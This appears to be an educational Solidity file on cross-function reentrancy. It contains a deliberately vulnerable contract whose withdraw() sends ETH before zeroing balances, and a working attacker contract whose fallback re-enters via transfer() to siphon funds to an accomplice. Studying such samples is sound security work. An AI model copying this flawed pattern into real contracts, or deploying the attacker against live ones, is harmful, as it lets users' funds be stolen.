// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CrossFunctionVulnerable
 * @notice EXAMPLE VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * @dev Demonstrates cross-function reentrancy vulnerability
 *      where shared state between functions can be exploited.
 */
contract CrossFunctionVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => bool) public hasWithdrawn;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    
    /**
     * @notice Deposit ETH
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice VULNERABLE: Withdraw with external call before state update
     * @dev During the external call, attacker can call transfer()
     *      which shares the 'balances' state variable
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        require(!hasWithdrawn[msg.sender], "Already withdrawn");
        
        // VULNERABILITY: External call BEFORE state updates
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // State updates happen AFTER external call - TOO LATE!
        balances[msg.sender] = 0;
        hasWithdrawn[msg.sender] = true;
        
        emit Withdrawal(msg.sender, balance);
    }
    
    /**
     * @notice Transfer balance to another user
     * @dev This function shares 'balances' state with withdraw()
     *      An attacker can re-enter through this during withdraw()
     */
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid recipient");
        
        // This can be called during withdraw() callback
        // At that point, balances[msg.sender] hasn't been zeroed yet!
        balances[msg.sender] -= amount;
        balances[to] += amount;
        
        emit Transfer(msg.sender, to, amount);
    }
    
    /**
     * @notice Get user balance
     */
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }
}


/**
 * @title CrossFunctionAttacker
 * @notice Exploits the cross-function reentrancy
 */
contract CrossFunctionAttacker {
    CrossFunctionVulnerable public target;
    address public owner;
    address public accomplice;
    uint256 public attackPhase;
    
    constructor(address _target, address _accomplice) {
        target = CrossFunctionVulnerable(_target);
        owner = msg.sender;
        accomplice = _accomplice;
    }
    
    /**
     * @notice Execute the cross-function attack
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        
        // Step 1: Deposit into vulnerable contract
        target.deposit{value: msg.value}();
        
        // Step 2: Start withdrawal (triggers reentrancy)
        attackPhase = 1;
        target.withdraw();
    }
    
    /**
     * @notice Fallback - this is where cross-function reentrancy happens
     */
    receive() external payable {
        if (attackPhase == 1) {
            attackPhase = 2;
            
            // Instead of calling withdraw() again (which would fail due to hasWithdrawn),
            // we call transfer() which shares the same 'balances' state
            // At this point, our balance hasn't been zeroed yet!
            uint256 balance = target.getBalance(address(this));
            
            if (balance > 0) {
                // Transfer our "balance" to accomplice before it's zeroed
                target.transfer(accomplice, balance);
            }
        }
    }
    
    function collectFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
